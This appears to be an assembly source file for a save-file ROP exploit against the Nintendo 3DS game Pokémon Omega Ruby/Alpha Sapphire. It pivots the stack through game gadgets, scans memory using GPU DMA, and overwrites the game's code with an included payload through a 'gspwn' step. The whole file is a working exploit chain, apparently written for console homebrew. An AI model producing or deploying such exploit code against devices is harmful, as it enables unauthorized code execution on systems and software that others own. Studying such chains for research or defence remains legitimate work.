.open "../oras_code/oras_code.bin",0x0
	initial_payload_size:
		.incbin "../oras_code/oras_code.bin"
	initial_payload_size_end:
.close

.nds

.include "oras_constants.s"
.include "oras_macros.s"

.create "../build/rop.bin",ORAS_SAVE_PICDATA_BUFFER_PTR

rop:

	; PIVOT
	.word ORAS_1ST_JMP_PTR ; this point to the address where it is stored in RAM, the game dereference this+0x4 and jump to it so it jumps to ORAS_PREPIVOT
	.word ORAS_PREPIVOT ; 1st jump, allows us to load the value stored at r0+0x8 in r2, when we jump r0=ORAS_1ST_JMP_PTR so ORAS_ROP_START is loaded in r2
	.word ORAS_ROP_START ; the address in RAM where the rop start
	.word 0x0
	.word ORAS_2ND_JMP_PTR ; this point to the address where it is stored in RAM, the game dereference this+0x4 and jump to it so it jumps to ORAS_PREPIVOT
	.word ORAS_PIVOT ; move r2 to sp 
					 ; then load the value stored at r0 in r2, so ORAS_2ND_JMP_PTR is stored in r2
					 ; then load the value stored at r2+0x10 in r2, so ROP_ORAS_NOP is stored in r2
					 ; then it jumps to r2
	.word 0x0
	.word 0x0
	.word ROP_ORAS_NOP

.fill (ORAS_ROP_START - .),0x0

	; ROP
	
	deref_to_r0_and_sub ORAS_APPMEMTYPE_PTR, 0x6 ; get the appmemtype,
												 ; I don't know why but it takes much more time when trying to directly 
												 ; use the appmemalloc, so I manually set the address depending on the 
												 ; appmemtype
	compare_r0_0 ; if appmemtype == 6 (N3DS)
	store_to_addr_if_equal loop_src, 0x14000000 + 0x07C00000 - ORAS_MAX_CODEBIN_SIZE ; set address for physmem gspwn
	
	scan_loop:
	
		.word ORAS_GSPGPU_GXTRYENQUEUE_WRAPPER
			.word 0x4
			loop_src:
				.word 0x14000000 + 0x04000000 - ORAS_MAX_CODEBIN_SIZE ; src overwritten
			loop_dst:
				.word LINEAR_BUFFER ; dest
			.word ORAS_SCANLOOP_STRIDE
			.word 0xFFFFFFFF
			.word 0xFFFFFFFF
			.word 0x8
			.word 0x0
			
			.word 0x0
			
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE
		
		sleep 100*1000, 0
		
		store_value scan_loop, ORAS_GSPGPU_GXTRYENQUEUE_WRAPPER

		dereference_to_r0 loop_dst
		.word ROP_ORAS_LDR_R0R0_POP_R4PC
			.word 0x100000000 - ORAS_MAGICVAL
		.word ROP_ORAS_ADD_R0_R0R4_POP_R4PC
			.word 0xDEADC0DE
		compare_r0_0
		
		store_to_addr_if_equal loop_break, (loop_end - (loop_break+4))
		
		.word ROP_ORAS_POP_R3_ADD_SP_SPR3_POP_PC
			loop_break:
				.word 0x0
		
		deref_to_r0_and_add loop_src, ORAS_SCANLOOP_STRIDE
		store_r0_to loop_src
		
		deref_to_r0_and_add loop_dst, 0x20
		store_r0_to loop_dst
		
		loop_pivot:
			stack_pivot scan_loop
		
	loop_end:
	
	memcpy LINEAR_BUFFER, ORAS_SAVE_PICDATA_BUFFER_PTR + (rop_end - rop), initial_payload_size_end - initial_payload_size
	flush_dcache LINEAR_BUFFER, 0x00100000
	gspwn loop_src, 0, LINEAR_BUFFER, 0x4000
	
	sleep 200*1000*1000, 0
	
	.word INITIAL_PAYLOAD_VA
	
	.word 0xDEAF0000	
	
rop_end:

.close